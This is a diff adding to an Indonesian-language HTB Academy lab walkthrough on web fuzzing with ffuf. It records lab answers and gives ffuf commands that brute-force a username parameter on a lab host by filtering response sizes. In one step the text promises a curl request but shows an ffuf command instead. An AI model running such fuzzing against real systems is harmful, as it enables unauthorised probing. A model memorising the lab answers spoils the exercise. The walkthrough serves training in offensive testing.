@@ -327,4 +327,27 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 
 ![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/Attacking%20Web%20Applications%20with%20Ffuf/assets/ffuf%2053.JPG)
 
+- **Answer:**
+```sh
+user, username
+```
+
 - **Question:** Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
+- Untuk daftar username kita akan gunakan wordlists `Usernames/Names/names.txt` dari seclists
+- Lakukan fuzzing untuk menemukan nilai parameter yang cocok. Pada percobaan pertama ditemukan banyak hasil dengan ukuran halaman 781 sehingga kita filter untuk halaman yang berukuran 781
+```sh
+ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://faculty.academy.htb:port/courses/linux-security.php7 -c -ic -fs 781
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/Attacking%20Web%20Applications%20with%20Ffuf/assets/ffuf%2054.JPG)
+
+- Username yang cocok adalah `harry`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/Attacking%20Web%20Applications%20with%20Ffuf/assets/ffuf%2055.JPG)
+
+- Lakukan post data menggunakan tool `curl`
+```sh
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:port/courses/linux-security.php7?FUZZ=key -c -ic -fs 774
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/Attacking%20Web%20Applications%20with%20Ffuf/assets/ffuf%2056.JPG)
